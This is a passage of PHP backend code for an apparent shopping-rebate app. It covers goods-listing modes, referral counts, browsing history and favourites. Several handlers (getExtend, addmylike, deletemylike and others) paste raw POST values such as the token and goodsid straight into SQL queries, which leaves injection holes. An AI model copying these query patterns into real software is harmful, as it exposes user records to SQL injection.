		if($set_off['app_shouye_zhanwai_onoff']==3&&intval($_POST['is_index'])==1&&empty($_POST['is_ksrk'])){
			$goods=self::wlgoods("app_shouye_");
			zfun::fecho("首页物料模式",$goods,1);
		}
		//超级券优惠券 物料模式
		if($set_off['app_yhq_zhanwai_onoff']==3&&$_POST['type'].''==='11'){
			$goods=self::wlgoods("app_yhq_");
			zfun::fecho("超级券物料模式",$goods,1);
		}
		
		//超高返 物料模式
		if($set_off['app_high_zhanwai_onoff']==3&&$_POST['type'].''==='1'){
			$goods=self::wlgoods("app_high_");
			zfun::fecho("超高返物料模式",$goods,1);	
		}
		//九块九 物料模式
		if($set_off['app_9_zhanwai_onoff']==3&&$_POST['type'].''==='3'){
			$goods=self::wlgoods("app_9_");
			zfun::fecho("9块9物料模式",$goods,1);	
		}
		//二十块 物料模式
		if($set_off['app_20_zhanwai_onoff']==3&&$_POST['type'].''==='7'){
			$goods=self::wlgoods("app_20_");
			zfun::fecho("20块物料模式",$goods,1);	
		}
		//这个跑到 Action/index/appapi/getgoods.action.php 里去了
		//淘抢购 物料模式
		if($set_off['app_tqg_zhanwai_onoff']==3&&$_POST['type'].''==='35'){
			$goods=self::wlgoods("app_tqg_");
			zfun::fecho("淘抢购物料模式",$goods,1);		
		}
		//聚划算 物料模式
		if($set_off['app_jhs_zhanwai_onoff']==3&&$_POST['type'].''==='36'){
			$goods=self::wlgoods("app_jhs_");
			zfun::fecho("聚划算物料模式",$goods,1);	
		}
//``````````````````````````````````````````````````````````````````````````````````````````````````````
		
		//超级券优惠券 擎天柱模式
		if($set_off['app_yhq_zhanwai_onoff']==4&&$_POST['type'].''==='11'){
			$goods=self::tb_optimus_material_goods($set_off['app_yhq_tb618']);
			zfun::fecho("超级券擎天柱模式",$goods,1);
		}
		
		//超高返 擎天柱模式
		if($set_off['app_high_zhanwai_onoff']==4&&$_POST['type'].''==='1'){
			$goods=self::tb_optimus_material_goods($set_off['app_high_tb618']);
			zfun::fecho("超高返擎天柱模式",$goods,1);
		}
		
		//9块9 擎天柱模式
		if($set_off['app_9_zhanwai_onoff']==4&&$_POST['type'].''==='3'){
			$goods=self::tb_optimus_material_goods($set_off['app_9_tb618']);
			zfun::fecho("9块9擎天柱模式",$goods,1);
		}
		
		//20 擎天柱模式
		if($set_off['app_20_zhanwai_onoff']==4&&$_POST['type'].''==='7'){
			$goods=self::tb_optimus_material_goods($set_off['app_20_tb618']);
			zfun::fecho("20擎天柱模式",$goods,1);
		}
		
		/*
		//淘抢购 擎天柱模式
		if($set_off['app_tqg_zhanwai_onoff']==4&&$_POST['type'].''==='35'){
			$goods=self::tb_optimus_material_goods($set_off['app_tqg_tb618']);
			zfun::fecho("淘抢购擎天柱模式",$goods,1);
		}
		
		//聚划算 擎天柱
		if($set_off['app_jhs_zhanwai_onoff']==4&&$_POST['type'].''==='36'){
			$goods=self::tb_optimus_material_goods($set_off['app_jhs_tb618']);
			zfun::fecho("淘抢购擎天柱模式",$goods,1);
		}*/

//``````````````````````````````````````````````````````````````````````````````````````````````````````
		
		$on_off=0;
		if($GLOBALS['json']['goods_pd_onoff']=='dtk'&&intval($_POST['tlj'])==1){$_POST['type']='tlj';$on_off=1;}
	
		if($GLOBALS['json']['goods_pd_onoff']==2&&intval($_POST['is_ksrk'])==1){$_POST['type']='ksrk';$on_off=1;}
		if($set_off['app_shouye_zhanwai_onoff']==2&&intval($_POST['is_index'])==1&&empty($_POST['is_ksrk'])){$_POST['type']=39;$on_off=1;}
		
		if($set_off['app_high_zhanwai_onoff']==2&&empty($_POST['is_index'])&&intval($_POST['type'])==1){$_POST['type']=6;$on_off=1;}
		if($set_off['app_yhq_zhanwai_onoff']==2&&empty($_POST['is_index'])&&intval($_POST['type'])==11){$_POST['type']=1;$on_off=1;}
		if($set_off['app_9_zhanwai_onoff']==2&&empty($_POST['is_index'])&&intval($_POST['type'])==2){$_POST['type']=3;$on_off=1;}
		if($set_off['app_20_zhanwai_onoff']==2&&empty($_POST['is_index'])&&intval($_POST['type'])==7){$_POST['type']=7;$on_off=1;}
		
		if($on_off==1){
			unset($_POST['num']);
			
			goods_all_typeAction::setDTK();	
		}
	}
	public static function goods_sx_str(){
		
		$arr=array();
		//首页站内
		if(intval($_POST['is_index'])==1){
			$_POST['type']=39;$arr=self::goods_sx_type();
		}
		//超高返
		if(empty($_POST['is_index'])&&intval($_POST['type'])==1){
			$_POST['type']=6;$arr=self::goods_sx_type();$_POST['type']=1;
		}
		//超级券
		if(empty($_POST['is_index'])&&intval($_POST['type'])==11){
			$_POST['type']=1;$arr=self::goods_sx_type();$_POST['type']=11;
		}
		if(empty($_POST['is_index'])&&intval($_POST['type'])==2){
			$_POST['type']=3;$arr=self::goods_sx_type();$_POST['type']=2;
		}
		if(empty($_POST['is_index'])&&intval($_POST['type'])==7){
			$_POST['type']=7;$arr=self::goods_sx_type();$_POST['type']=7;
		}
		return $arr;
	}
	public static function goods_sx_type(){
		$arr=goods_all_typeAction::setDTK();//这是新的类型商品
		$str2="";
		if(!empty($arr)){
			$tmp=$arr;
			if(!empty($tmp['commission'])){
				$str2.=" and commission>".floatval($tmp['commission']);
				$_POST['sx_commission']=floatval($tmp['commission']);
			}
			if(!empty($tmp['goods_sales'])){
				$str2.=" and goods_sales>".floatval($tmp['goods_sales']);
				$_POST['sx_goods_sales']=floatval($tmp['goods_sales']);
			}
			if(!empty($arr['min_price'])){
				$str2.=" and goods_price>".floatval($tmp['min_price']);
				$_POST['sx_min_price']=floatval($tmp['min_price']);
			}
			if(!empty($arr['max_price'])){
				$str2.=" and goods_price<".floatval($tmp['max_price']);
				$_POST['sx_max_price']=floatval($tmp['max_price']);
			}
		}
		$data=array("arr"=>$arr,"str"=>$str2);
		return $data;
	}
	//获取首页商品设置 推荐商品设置
	public static function getwhereset(&$where,&$sort,$name=''){
		if(empty($name))zfun::fecho("error");
		$set=json_decode(urldecode($GLOBALS['action']->getSetting($name)),true);
		if(empty($set))return;
		if(!empty($set['goodssort']))$sort=$set['goodssort'];
		if(!empty($set['cid'])){
			$Category=$GLOBALS['action']->getDatabase("Category");
			$cids=$Category->getCateId($set['cid']);
			$where.=" and cate_id IN($cids)";
		}
		$where.=" and goods_type=".intval($set['goods_type']);
		if(!empty($set['shop_id']))$where.=" and shop_id=".$set['shop_id'];
		if(!empty($set['yhq']))$where.=" and yhq=1";
		if(!empty($set['start_price']))$where.=" and goods_price >=".floatval($set['start_price']);
		if(!empty($set['end_price']))$where.=" and goods_price <=".floatval($set['end_price']);
		//活动
		if(!empty($set['aid'])){
			$time=time();
			$tmp=zfun::f_select("GoodsActivity","cid=".intval($set['aid'])." and start_time <$time and end_time >$time","gid");
			$gids=-1;foreach($tmp as $k=>$v)$gids.=",".$v['gid'];
			$where.=" and id IN($gids)";
		}
	}
	public function midcategorynav() {
		/*if (!$this -> sign()) {
			$this -> fecho(null, 0, "签名错误");
		}*/
		$guanggaoModel = $this -> getDatabase('Guanggao');
		$guanggao = $guanggaoModel -> select('hide=0 AND type="appmidnav"', 'img,url,description,title,ktype',0,0,"sort desc");
		$goodsModel = $this -> getDatabase('Goods');
		/*$year = data("Y", time());
		 $time1 = $year . ' 23:59:59';
		 $time_str = strtotime($time1);
		 $cle = time() - $time1;
		 $h = floor(($cle % (3600 * 24)) / 3600);
		 //%取余
		 $m = floor(($cle % (3600 * 24)) % 3600 / 60);
		 $s = floor(($cle % (3600 * 24)) % 60);
		 $time2 = $h . ':' . $m . ':' . $s;*/
		foreach ($guanggao as $k => $v) {
			if(!empty($v['img']))$guanggao[$k]['img'] = UPLOAD_URL . 'slide/' . $v['img'];
			$guanggao[$k]['description1'] = $v['description'];
			$guanggao[$k]['UIIdentifier']=intval($v['ktype']);
			unset($guanggao[$k]['ktype']);
			if ($k == 0) {
				//$goods = $goodsModel -> select('is_bcg=1', 'goods_price', 1, null, 'goods_sales desc');
				$guanggao[$k]['goods_price'] = self::getSetting("baicaijia");
			}
		}
		$this -> fecho($guanggao, 1, "ok");
	}
	public function getExtendtopthree() {
		self::checksign();
		$userModel = $this -> getDatabase('User');
		$jf_spread = $this -> getSetting('jf_spread_jf');
		$user = $userModel -> select("", "id,nickname",3,0,"commission desc");
		//jj explosion
		$uarr=array();
		$ucount=zfun::f_select("User","extend_id > 0","id,extend_id");
		foreach($ucount as $k=>$v){
			if(empty($uarr[$v['extend_id']]))$uarr[$v['extend_id']]=1;
			else $uarr[$v['extend_id']]++;
		}
		arsort($uarr,SORT_NUMERIC);
		$narr=array();
		$i=0;
		foreach($uarr as $k=>$v){
			$i++;if($i==4)break;
			$narr[]=array("uid"=>$k,"count"=>$v);	
		}
		//zheli
		$rarr=array();
		foreach ($narr as $k => $v) {
			$user=zfun::f_row("User","id=".$v['uid']);
			$user['count'] = $v['count'];
			$user['returnf'] = $user['count'] * $jf_spread;
			$user['nickname'] = $this -> cut_str($user['nickname'], 3, 0) . '**' . $this -> cut_str($user['nickname'], 3, -3);
			$rarr[]=$user;
		}
		$this -> fecho($rarr, 1, "ok");
	}
	function cut_str($string, $sublen, $start = 0, $code = 'UTF-8') {
		if ($code == 'UTF-8') {
			$pa = "/[\x01-\x7f]|[\xc2-\xdf][\x80-\xbf]|\xe0[\xa0-\xbf][\x80-\xbf]|[\xe1-\xef][\x80-\xbf][\x80-\xbf]|\xf0[\x90-\xbf][\x80-\xbf][\x80-\xbf]|[\xf1-\xf7][\x80-\xbf][\x80-\xbf][\x80-\xbf]/";
			preg_match_all($pa, $string, $t_string);
			if (count($t_string[0]) - $start > $sublen)
				return join('', array_slice($t_string[0], $start, $sublen));
			return join('', array_slice($t_string[0], $start, $sublen));
		} else {
			$start = $start * 2;
			$sublen = $sublen * 2;
			$strlen = strlen($string);
			$tmpstr = '';
			for ($i = 0; $i < $strlen; $i++) {
				if ($i >= $start && $i < ($start + $sublen)) {
					if (ord(substr($string, $i, 1)) > 129) {
						$tmpstr .= substr($string, $i, 2);
					} else {
						$tmpstr .= substr($string, $i, 1);
					}
				}
				if (ord(substr($string, $i, 1)) > 129)
					$i++;
			}
			return $tmpstr;
		}
	}
	public function getExtend() {
		if (!$this -> sign()) {
			$this -> fecho(NULL, 0, "签名错误");
		}
		if (empty($_POST['token'])) {
			$this -> fecho(NULL, 0, "未登录");
		}
		$jf_spread = $this -> getSetting('jf_spread_jf');
		$userModel = $this -> getDatabase('User');
		$userid = $userModel -> selectRow('token="' . $_POST['token'] . '"');

		$eids=self::getc($userid['id'],"extend_id",3);
		$user = $userModel -> select("extend_id IN($eids)", "id,nickname");
		foreach ($user as $k => $v) {
			$user2 = $userModel -> selectRow('extend_id=' . $v['id'], "count(*)");
			$count = $user2['count(*)'];
			$user[$k]['returnf'] = $count * $jf_spread;
		}
		$this -> fecho($user, 1, "ok");
	}
	//explosion
	public static function getc($uid, $tidname = "extend_id", $maxlv = 9) {//获取下级
		if (empty($uid))
			return 0;
		$arr = array();
		$arr[0] = intval($uid);
		$lv = 0;
		$eid = 0;
		$tid = $uid;
		do {
			$lv++;
			$user = zfun::f_select("User", "$tidname IN($tid) and $tidname<>0 and $tidname<>''");
			if (!empty($user)) {
				$tid = "";
				foreach ($user as $k => $v)
					$tid .= "," . $v['id'];
				$tid = substr($tid, 1);
				$arr[$lv] = $tid;
			}
		} while(!empty($user)&&$lv<$maxlv-1);
		$ids = implode(",", $arr);
		if (empty($ids))
			$ids = -1;
		return $ids;
		/*
		$user = zfun::f_select("User", "$tidname IN($ids) and id<>0");
		$arr = array();
		foreach ($user as $k => $v)
			$arr[$v[$tidname]][$v['id']] = $v;
		return $arr;*/
	}
	//explosion
	public function getmyself() {
		//zheli
		if (!$this -> sign()) {
			$this -> fecho(NULL, 0, "签名错误");
		}
		if (empty($_POST['token'])) {
			$this -> fecho(NULL, 0, "未登录");
		}
		$jf_spread = $this -> getSetting('commission_spread');
		$userModel = $this -> getDatabase('User');
		$userid = $userModel -> selectRow('token="' . $_POST['token'] . '"');
		/*$user = $userModel -> select('extend_id=' . $userid['id']);
		$count = count($user);*/
		$count=zfun::f_count("User","extend_id=".intval($userid['id']));
		$returnintegral = $count * $jf_spread;
		if (empty($returnintegral)) {
			$returnintegral = 0;
		}
		$data=zfun::f_select("Interal","type=100 and data<>'' and uid=".$userid['id']." and detail like '%佣金%'","interal");
		$returnintegral=0;
		foreach($data as $k=>$v){
			$returnintegral+=floatval($v['interal']);	
		}
		$this -> fecho(array('returnintegral' => $returnintegral, 'count' => $count), 1, "ok");
	}
	public function addfootmark() {
		if (!$this -> sign()) {$this -> fecho(NULL, 0, "签名错误");}
		$footmarkModel = $this -> getDatabase('FootMark');
		$userModel = $this -> getDatabase('User');
		if (empty($_POST['goodsid']) && empty($_POST['time']) && empty($_POST['token'])) {
			$this -> fecho(NULL, 0, "参数不完整");
		}
		if(empty($_POST['token']))$this -> fecho(NULL, 1, "请先登录");
		$userid = $userModel -> selectRow('token="' . $_POST['token'] . '"');
		if(empty($userid))zfun::fecho("用户不存在");
		$uid=$userid['id'];
		$fnuo_id=$_POST['goodsid'];
		$tmp=zfun::f_count("Goods","fnuo_id='".$fnuo_id."' and shop_id=4");
		$where="goodsid='".$_POST['goodsid']."' and uid=".$uid;
		$f_count=zfun::f_count("FootMark",$where);
		if(!empty($tmp)){
			$arr=array(
				"goodsid" => $_POST['goodsid'],
				"uid" => $uid,
				"time" => time(),
			);
			if(!empty($f_count)){
				zfun::f_update("FootMark",$where,$arr);	
			}
			else{
				zfun::f_insert("FootMark",$arr);		
			}
			$this -> fecho(null, 1, 'ok');//jj explosion
		}
		//该接口已注销
		$this -> fecho(NULL, 1, "ok");
		actionfun("default/alimama");
		$tmp=alimamaAction::getcommission($fnuo_id);
		if(empty($tmp))zfun::fecho("error");
		$shop_arr=array(0=>1,1=>2);
		$data=array(
			"goods_title"=>str_replace(array("<span class=H>","</span>","'"),"",$tmp['title']),
			"goods_price"=>floatval($tmp['zkPrice']),
			"goods_cost_price"=>floatval($tmp['reservePrice']),
			"goods_img"=>"https:".str_replace(array("https:","http:"),"",$tmp['pictUrl'])."_400x400.jpg",
			"goods_sales"=>intval($tmp['biz30day']),
			"commission"=>floatval($tmp['tkRate']),
			"shop_id"=>$shop_arr[$tmp['userType']],	
			"fnuo_id"=>$tmp['auctionId'],
			"yhq"=>0,
			"yhq_price"=>0,
			"yhq_span"=>'',
		);
		$arr=array(
			"goodsid" => $_POST['goodsid'],
			"uid" => $userid['id'],
			"data"=>zfun::f_json_encode($data),
			"starttime"=>time(),
			"endtime"=>time(),
		);
		if(!empty($f_count)){
			unset($arr['starttime']);
			zfun::f_update("FootMark",$where,$arr);
		}
		else{
			zfun::f_insert("FootMark",$arr);
		}
		$this -> fecho(NULL, 1, "ok");
		
	}
	public function getfootmark() {
		$user=appcomm::signcheck(1);$uid=$user['id'];
		//jj explosion
		//删除一百后的记录
		$del_data=zfun::f_select("FootMark","uid=".$uid,"id",100,100,"starttime desc");
		if(!empty($del_data)){
			$ids=-1;
			foreach($del_data as $k=>$v){$ids.=",".$v['id'];}
			zfun::f_delete("FootMark","id IN($ids)");
		}
		$footmark=appcomm::f_goods("FootMark","uid='{$uid}'","","starttime desc",NULL,20);
		
		$goods=zfun::f_kdata("Goods",$footmark,"goodsid","fnuo_id"," shop_id=4");
		foreach($goods as $k=>$v){
			if($v['shop_id']==4)$goods[$k]['shop_id']=3;	
		}
		$set=zfun::f_getset("fan_all_str");
		foreach ($footmark as $k => $v) {
			if(!empty($v['data'])){
				$goods_=json_decode($v['data'],true);
			}
			else {
				zfun::f_delete("FootMark","id=".$v['id']);
				unset($footmark[$k]);
				continue;
				$goods_=$goods[$v['goodsid']];
			}
			unset($footmark[$k]['data']);
			$shop = zfun::f_row("Dp",'dp_id="' . $goods_['dp_id'] . '"');
			if ($shop) {
				$footmark[$k]['goods_shop'] = $shop['name'];
			}
			$footmark[$k]['jd_url']='';
			if ($goods_['shop_id']==3) {
				$footmark[$k]['jd_url'] =INDEX_WEB_URL."?act=jdapi&ctrl=gotobuy&gid=".$goods_['fnuo_id'];
			}
			$footmark[$k]['commission'] = $goods_['commission'];
			$footmark[$k]['shop_id'] = $goods_['shop_id'];
			$footmark[$k]['returnfb'] = $goods_['fcommission'];
			$footmark[$k]['returnbl'] = $goods_['fbili'];
			$footmark[$k]['goods_title'] = $goods_['goods_title'];
			$footmark[$k]['goods_img'] = $goods_['goods_img'];
			$footmark[$k]['goods_price'] = $goods_['goods_price'];
			$footmark[$k]['fnuo_id'] = $goods_['fnuo_id'];
			$footmark[$k]['id'] = $goods_['fnuo_id'];
			$footmark[$k]['starttime'] = date("H:i:s", $v['starttime']);
			$footmark[$k]['endtime'] = date("H:i:s", $v['endtime']);
			$footmark[$k]['highcommission_wap_url'] = $goods_['highcommission_wap_url'];
			$footmark[$k]['goods_cost_price'] = $goods_['goods_cost_price'];
			$footmark[$k]['yhq'] = $goods_['yhq'];
			$footmark[$k]['yhq_price'] = $goods_['yhq_price'];
			$footmark[$k]['fan_all_str'] = $set['fan_all_str'];
			//zheli boom
			$footmark[$k]['fnuo_url']=$goods_['fnuo_url'];
			if(empty($footmark[$k]['pdd'])&&empty($footmark[$k]['jd'])){
				actionfun("comm/tbmaterial");
				$goods_commission=tbmaterial::id($footmark[$k]['fnuo_id']);
				//zfun::isoff($goods_commission,1);
				
				if(!empty($goods_commission)){
					$footmark[$k]['commission']=$goods_commission['commission'];
					$footmark[$k]['goods_sales']=$goods_commission['goods_sales'];
					$footmark[$k]['goods_price']=$goods_commission['goods_price'];
					$footmark[$k]['goods_cost_price']=$goods_commission['goods_cost_price'];
					$footmark[$k]['yhq_price']=$goods_commission['yhq_price'];
					$footmark[$k]['yhq_span']=$goods_commission['yhq_span'];
					$footmark[$k]['goods_img']=$goods_commission['goods_img'];
					if(!empty($goods_['yhq_price'])){
						$footmark[$k]['wl_yhq_url']=$goods_commission['yhq_url'];
						$footmark[$k]['yhq_use_time']="使用期限：".date("Y-m-d",$goods_commission['start_time'])."-".date("Y-m-d",$goods_commission['end_time']);	
					}
					$footmark[$k]['shop_dsr']=$goods_commission['shop_dsr'];
					$footmark[$k]['shop_title']=$goods_commission['shop_title'];
					$footmark[$k]['seller_id']=$goods_commission['seller_id'];
				}
				/*actionfun("default/gototaobao");
				$tmp_yhq_url=gototaobaoAction::check_yhq_url(array("goods_title"=>$goods_['goods_title'],"fnuo_id"=>$goods_['fnuo_id']),1);
		
				if(!empty($GLOBALS['yhq_price']))$footmark[$k]['yhq_price']=$GLOBALS['yhq_price'];
				if(!empty($GLOBALS['yhq_span']))$footmark[$k]['yhq_span']=$GLOBALS['yhq_span'];
				if(!empty($GLOBALS['goods_cost_price']))$footmark[$k]['goods_cost_price']=$GLOBALS['goods_cost_price'];
				if(!empty($GLOBALS['goods_price']))$footmark[$k]['goods_price']=$GLOBALS['goods_price'];
				if(!empty($GLOBALS['dtk_commission'])&&$GLOBALS['dtk_commission']>$footmark[$k]['commission'])$footmark[$k]['commission']=$GLOBALS['dtk_commission'];*/
			}
		}
	
		$footmark=zfun::f_fgoodscommission($footmark);
		
		foreach($footmark as $k=>$v){
			$footmark[$k]['returnfb'] = $v['fcommission'];
			$footmark[$k]['returnbl'] = $v['fbili'];
		}
		appcomm::goodsfanlioff($footmark);
		$footmark=array_values($footmark);
	
		zfun::fecho("足迹",$footmark,1);
	}
	public function addmylike() {
		if (!$this -> sign()) {
			$this -> fecho(NULL, 0, "签名错误");
		}
		$set=zfun::f_getset("ggapitype");
		$mylikeModel = $this -> getDatabase('MyLike');
		if(empty($_POST['token']))self::fecho(0,0,"请登录");
		if (empty($_POST['goodsid']) && empty($_POST['token'])) {
			$this -> fecho(array('is_cancel' => 1), 0, "参数不完整");
		}
		$userModel = $this -> getDatabase('User');
		$userid = $userModel -> selectRow('token="' . $_POST['token'] . '"');
		if(empty($userid))$this -> fecho(null, 0, '用户不存在');
		$uid=$userid['id'];
		$fnuo_id=$_POST['goodsid'];
		$where="uid=$uid and goodsid='".$fnuo_id."'";
		$tmp=zfun::f_count("MyLike",$where);
		if(!empty($tmp))$this -> fecho(null, 1, '已收藏');
		
		
			actionfun("comm/tbmaterial");
			$tmp=tbmaterial::id($_POST['goodsid']);
			if(!empty($tmp)){
				$tmp['title']=$tmp['goods_title'];$tmp['zkPrice']=$tmp['goods_price'];
				$tmp['reservePrice']=$tmp['goods_cost_price'];$tmp['pictUrl']=$tmp['goods_img'];
				$tmp['biz30day']=$tmp['goods_sales'];$tmp['tkRate']=$tmp['commission'];
				$tmp['userType']=$tmp['shop_id'];$tmp['auctionId']=$tmp['fnuo_id'];
			}
		
		if(!empty($tmp['fnuo_id'])){
			actionfun("default/gototaobao");
			//$tmp_yhq_url=gototaobaoAction::check_yhq_url(array("goods_title"=>$tmp['goods_title'],"fnuo_id"=>$tmp['fnuo_id']),1);
			if(!empty($tmp_yhq_url)&&empty($tmp['yhq_url'])&&empty($getgoodstype)){
				$tmp['yhq_url']=$tmp_yhq_url;
				$tmp['yhq']=1;
			}
			//如果
			$tmp['yhq_type']=0;
			if(!empty($GLOBALS['yhq_type']))$tmp['yhq_type']=1;//是否是隐藏券
			//if(empty($getgoodstype)){
				//jj explosion 读取大淘客 佣金
	
				//jj explosion
				if(!empty($GLOBALS['yhq_price']))$tmp['yhq_price']=$GLOBALS['yhq_price'];
				if(!empty($GLOBALS['yhq_span']))$tmp['yhq_span']=$GLOBALS['yhq_span'];
				if(!empty($GLOBALS['goods_cost_price']))$tmp['goods_cost_price']=$GLOBALS['goods_cost_price'];
				if(!empty($GLOBALS['goods_price']))$tmp['goods_price']=$GLOBALS['goods_price'];
				if(!empty($GLOBALS['dtk_commission'])&&$GLOBALS['dtk_commission']>$tmp['commission'])$tmp['tkRate']=$GLOBALS['dtk_commission'];
			//}
		}
		//拼多多
		if(empty($tmp['fnuo_id'])){
			actionfun("comm/pinduoduo");
			$tmp=pinduoduo::id($_POST['goodsid']);
			if(!empty($tmp)){
				$tmp['title']=$tmp['goods_title'];$tmp['zkPrice']=$tmp['goods_price'];
				$tmp['reservePrice']=$tmp['goods_cost_price'];$tmp['pictUrl']=$tmp['goods_img'];
				$tmp['biz30day']=$tmp['goods_sales'];$tmp['tkRate']=$tmp['commission'];
				$tmp['pdd']=1;$tmp['userType']=5;$tmp['auctionId']=$tmp['fnuo_id'];
			}
		}
		//京东
		if(empty($tmp['fnuo_id'])){
			actionfun("comm/jingdong");
			$tmp=jingdong::id($_POST['goodsid']);
			
			if(!empty($tmp)){
				$tmp['title']=$tmp['goods_title'];$tmp['zkPrice']=$tmp['goods_price'];
				$tmp['reservePrice']=$tmp['goods_cost_price'];$tmp['pictUrl']=$tmp['goods_img'];
				$tmp['biz30day']=$tmp['goods_sales'];$tmp['tkRate']=$tmp['commission'];
				$tmp['jd']=1;$tmp['userType']=4;$tmp['auctionId']=$tmp['fnuo_id'];
			}
		}
		if(empty($tmp['fnuo_id']))zfun::fecho("error");
		$shop_arr=array(0=>1,1=>2,4=>4,5=>5);
		$data=array(
			"goods_title"=>str_replace(array("<span class=H>","</span>","'"),"",$tmp['title']),
			"goods_price"=>floatval($tmp['zkPrice']),
			"goods_cost_price"=>floatval($tmp['reservePrice']),
			"goods_img"=>"https:".str_replace(array("https:","http:"),"",$tmp['pictUrl']),
			"goods_sales"=>intval($tmp['biz30day']),
			"commission"=>floatval($tmp['tkRate']),
			"shop_id"=>$shop_arr[$tmp['userType']],	
			"fnuo_id"=>$tmp['auctionId'],
			"pdd"=>intval($tmp['pdd']),
			"jd"=>intval($tmp['jd']),
			"yhq"=>0,
			"yhq_price"=>floatval($tmp['yhq_price']),
			"yhq_span"=>floatval($tmp['yhq_price'])."元",
		);
		
		if(!empty($data['yhq_price']))$data['yhq']=1;
		$arr=array(
			"goodsid" => $_POST['goodsid'],
			"uid" => $userid['id'],
			"time" => time(),
			"data"=>zfun::f_json_encode($data),
		);
		
		$mylike = $mylikeModel -> insert($arr);
		appcomm::set_app_cookie_mylike($userid['id']);
		$this -> fecho(null, 1, 'ok');
	}
	public function deletemylike() {
		if (!$this -> sign()) {
			$this -> fecho(NULL, 0, "签名错误");
		}
		if (empty($_POST['token'])) {
			$this -> fecho(NULL, 0, "缺少参数");
		}
		if (empty($_POST['goodsid'])) {
			$this -> fecho(NULL, 0, "参数不完整");
		}
		$mylikeModel = $this -> getDatabase('MyLike');
		$userModel = $this -> getDatabase('User');
		$userid = $userModel -> selectRow("token='{$_POST['token']}'");
		if(empty($userid))$this -> fecho(null, 0, "用户不存在");
		$mylike = $mylikeModel -> delete('goodsid=' . $_POST['goodsid'] . ' AND uid=' . $userid['id']);
		appcomm::set_app_cookie_mylike($userid['id']);
		$this -> fecho(null, 1, "ok");
	}
	public function getmylike() {
		$user=appcomm::signcheck(1);$uid=$user['id'];
		$mylike=appcomm::f_goods("MyLike","uid='{$uid}' and type=0","","time desc",NULL,20);
		$set=zfun::f_getset("fan_all_str,mylike_all_msg");
		$str=$set['fan_all_str'];
		$goodsdata=zfun::f_kdata("Goods",$mylike,"goodsid","fnuo_id");
		foreach ($mylike as $k => $v) {
			if(empty($v['data']))$goods = $goodsdata[$v['goodsid']];
			else $goods=json_decode($v['data'],true);
			unset($mylike[$k]['data']);
			if(!empty($goods)&&$goods['shop_id']==4)$goods['shop_id']=3;
			$mylike[$k]['jd_url']='';
			$mylike[$k]['shop_id']=$goods['shop_id'];
			$mylike[$k]['pdd'] = intval($goods['pdd']);
			$mylike[$k]['jd'] = intval($goods['jd']);
			$mylike[$k]['fnuo_id'] = $goods['fnuo_id'];
			$mylike[$k]['shop_id'] = $goods['shop_id'];
			$mylike[$k]['goods_title'] = $goods['goods_title'];
			$mylike[$k]['goods_img'] = $goods['goods_img'];
			$mylike[$k]['goods_price'] = $goods['goods_price'];
			$mylike[$k]['goods_cost_price'] = $goods['goods_cost_price'];
			$mylike[$k]['highcommission_wap_url'] = $goods['highcommission_wap_url'];
			$mylike[$k]['commission']=$goods['commission'];
			$mylike[$k]['goods_cost_price'] = $goods['goods_cost_price'];
			$mylike[$k]['yhq'] = $goods['yhq'];
			$mylike[$k]['yhq_price'] = $goods['yhq_price'];
			$mylike[$k]['fan_all_str'] = $set['fan_all_str'];
			$mylike[$k]['mylike_all_msg'] = $set['mylike_all_msg'];
			if(empty($mylike[$k]['pdd'])&&empty($mylike[$k]['jd'])){
				actionfun("comm/tbmaterial");
				if(!empty($mylike[$k]['fnuo_id']))$goods_commission=tbmaterial::id($mylike[$k]['fnuo_id']);
				if(!empty($goods_commission)){
					$mylike[$k]['commission']=$goods_commission['commission'];
					$mylike[$k]['goods_sales']=$goods_commission['goods_sales'];
					$mylike[$k]['goods_price']=$goods_commission['goods_price'];
					$mylike[$k]['goods_cost_price']=$goods_commission['goods_cost_price'];
					$mylike[$k]['yhq_price']=$goods_commission['yhq_price'];
					$mylike[$k]['yhq_span']=$goods_commission['yhq_span'];
					$mylike[$k]['goods_img']=$goods_commission['goods_img'];
					if(!empty($goods['yhq_price'])){
						$mylike[$k]['wl_yhq_url']=$goods_commission['yhq_url'];
						$mylike[$k]['yhq_use_time']="使用期限：".date("Y-m-d",$goods_commission['start_time'])."-".date("Y-m-d",$goods_commission['end_time']);	
					}
					$mylike[$k]['shop_dsr']=$goods_commission['shop_dsr'];
					$mylike[$k]['shop_title']=$goods_commission['shop_title'];
					$mylike[$k]['seller_id']=$goods_commission['seller_id'];
				}
				actionfun("default/gototaobao");
				/*$tmp_yhq_url=gototaobaoAction::check_yhq_url(array("goods_title"=>$goods['goods_title'],"fnuo_id"=>$goods['fnuo_id']),1);

				if(!empty($GLOBALS['yhq_price']))$mylike[$k]['yhq_price']=$GLOBALS['yhq_price'];
				if(!empty($GLOBALS['yhq_span']))$mylike[$k]['yhq_span']=$GLOBALS['yhq_span'];
				if(!empty($GLOBALS['goods_cost_price']))$mylike[$k]['goods_cost_price']=$GLOBALS['goods_cost_price'];
				if(!empty($GLOBALS['goods_price']))$mylike[$k]['goods_price']=$GLOBALS['goods_price'];
				if(!empty($GLOBALS['dtk_commission'])&&$GLOBALS['dtk_commission']>$mylike[$k]['commission'])$mylike[$k]['commission']=$GLOBALS['dtk_commission'];*/
			}
		}
			
		//zheli boom
		$set=zfun::f_getset("goodscol_fanli_str1");
		
		if($set['goodscol_fanli_str1'])$str=$set['goodscol_fanli_str1'];
		$mylike=zfun::f_fgoodscommission($mylike);
		appcomm::goodsfanlioff($mylike);
		$mylike=appcomm::goodsfeixiang($mylike);
		foreach($mylike as $k=>$v){
			
			if ($v['fcommission']>0) {
				$mylike[$k]['return_title'] =$str."".$v['fcommission'];
			} else {
				$mylike[$k]['return_title'] = '无存款';
			}
			unset($mylike[$k]['tdj_data'],$mylike[$k]['detailurl']);	
		}
		
		zfun::fecho("我的收藏",$mylike,1);
	
	}
	public function gethelper() {
		if (!$this -> sign()) {
			$this -> fecho(NULL, 0, "签名错误");
		}
		if (empty($_POST['type'])) {
			$this -> fecho(NULL, 0, "缺少必要参数");
		}
		$HelperArticleModel = $this -> getDatabase('HelperArticle');
		switch($_POST['type']) {
			case 1 :
				$HelperArticle = $HelperArticleModel -> select('type="apphelper" AND hide=0', 'title,content', null, null, 'sort desc');
				break;
			case 2 :
				$HelperArticle = $HelperArticleModel -> select('type="apparticle" AND hide=0', 'title,content', null, null, 'sort desc');
				break;
			case 3 :
				$HelperArticle = $HelperArticleModel -> select('type="appquestion" AND hide=0', 'title,content', null, null, 'sort desc');
				break;
		}
		$this -> fecho($HelperArticle, 1, "ok");
	}
	public function setideasBox(){
		appcomm::signcheck();
		if(!empty($_POST['token'])){
			$user=zfun::f_row("User","token='".filter_check($_POST['token'])."'");
			$uid=$user['id'];
		}
		$arr=array(
